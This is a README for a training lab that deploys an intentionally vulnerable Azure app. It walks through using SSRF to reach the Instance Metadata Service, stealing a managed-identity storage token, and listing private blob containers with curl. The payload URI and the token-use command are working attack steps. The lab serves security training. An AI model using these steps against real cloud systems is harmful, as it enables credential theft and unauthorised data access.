# 🏴‍☠️ Azure SSRF & IMDS Exploitation Lab

This Terraform lab deploys an intentionally vulnerable Azure environment to practice exploiting **Server-Side Request Forgery (SSRF)** to steal an **Instance Metadata Service (IMDS) Role Token**, and eventually discovering an **Insecure IAM/Storage misconfiguration**.

### 🌟 New Features (V2)
- **Premium Dashboard**: A modern, dark-themed UI for auditing and SSRF exploitation.
- **Ansible Integration**: More robust, industrial-strength configuration management.
- **Improved Security**: Uses private storage containers and Managed Identity for realistic exfiltration.

---

## 🛠️ Lab Setup

1. **Prerequisites**:
   - Terraform installed
   - Ansible installed (on controller machine)
   - Azure CLI (`az login`)

2. **Deploy Infrastructure**:
   ```bash
   terraform init
   terraform apply -auto-approve
   ```

3. **Configure the VM (Ansible)**:
   Wait 1 minute for the VM to boot, then push the configuration:
   ```bash
   ansible-playbook -i hosts.ini playbook.yml
   ```

---

## 🎯 Attack Walkthrough

### 1. Identify the Vulnerability
The Terraform outputs will provide you with the `vulnerable_app_url` (e.g., `http://20.x.x.x`). Navigate to this URL in your browser.
Use the "Security Audit Tool" to retrieve internal resources.

### 2. SSRF to IMDS Pivot (Token Extraction)
Use the web console to steal the **Managed Identity Storage Token**:

```text
Target URI: http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://storage.azure.com/
```

Copy the `access_token` from the raw JSON response.

### 3. Exfiltration and Discovery
Use your stolen token from your local terminal to discover private content:

```bash
# List Containers (Discovery)
curl -H "Authorization: Bearer <TOKEN>" \
     -H "x-ms-version: 2019-12-12" \
     "https://<STORAGE_ACCOUNT>.blob.core.windows.net/?comp=list"
```

---

## 🧹 Cleanup
Destroy the environment to avoid incurring Azure charges:
```bash
terraform destroy -auto-approve
```
